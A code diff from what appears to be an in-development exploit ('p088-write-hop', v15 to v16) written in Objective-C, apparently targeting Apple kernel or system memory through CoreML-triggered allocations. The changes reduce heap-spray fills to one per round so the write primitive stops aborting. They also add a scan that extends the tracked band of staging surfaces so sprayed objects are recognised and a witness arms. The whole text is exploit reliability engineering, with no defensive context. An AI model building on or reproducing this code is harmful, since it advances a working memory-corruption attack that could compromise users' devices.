@@ -181,7 +181,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P088_BUILD @"p088-write-hop-v15-pagesafe"
+#define P088_BUILD @"p088-write-hop-v16-bandintime"
 
 /* kernel-target tap: 0 = in-process T (safe-ish), 1 = kernel sid (PANIC) */
 #define P088_KERNEL_TARGET 0
@@ -1067,7 +1067,13 @@ static NSString *p088_yfmt(double y) {
            CONV rounds keep the single timed A the volley window needs. */
         __block uint32_t aVolley = 0;
         dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-            uint32_t reps = conv ? 1 : 3;
+            /* v16: back to ONE fill per measure round. v15's deterministic
+               pop lands IN the run (mapped + readable) every boot — one
+               guaranteed sample beats v12's 3 fills, whose non-first
+               prewires pop stray/churn-freed chunks and cross unmapped
+               page-gaps (the repeated writer aborts killed the last
+               boots). CONV rounds unaffected (single timed A). */
+            uint32_t reps = 1;
             for (uint32_t rep = 0; rep < reps; rep++) {
                 if (rep > 0) {
                     MLModelConfiguration *cfg12 = [[MLModelConfiguration alloc] init];
@@ -1154,6 +1160,23 @@ static NSString *p088_yfmt(double y) {
                  (w == 0 ? dA * 1000.0 : (tA1 - t0) * 1000.0), aErr,
                  (w != 0) ? "(STILL IN-FLIGHT 10s)" : "",
                  aVolley, aVolley == 1 ? "" : "s");
+
+        /* v16 band EXTENSION-INTIME (the v15 boots' order bug, both SKUs):
+           the fresh-A prewire's staging surfaces (sids 1073..1300 tonight)
+           come into existence DURING the round, after the v14 pre-scan
+           (which correctly found 0). One scan HERE — after A's fill
+           allocated its staging, BEFORE the D2 census-classify — extends
+           g_p088_stageMax over the fill's own sids so the FIRST harvest
+           classifies OUR fills correctly (hitOurs=1 -> witness arms). */
+        {
+            uint32_t hiPost = hiSeen;
+            p088_stage_scan(&hiPost);
+            if (hiPost > hiSeen) {
+                hiSeen = hiPost;
+                p088_log(@"  [v16] band extended post-A to %u (fill's staging class)",
+                         hiSeen);
+            }
+        }
 
         /* --- D2: harvest the whole run -> fill-hit INDEX MAP (no destroy:
            the run is persistent; emptied ports are re-armed instead).
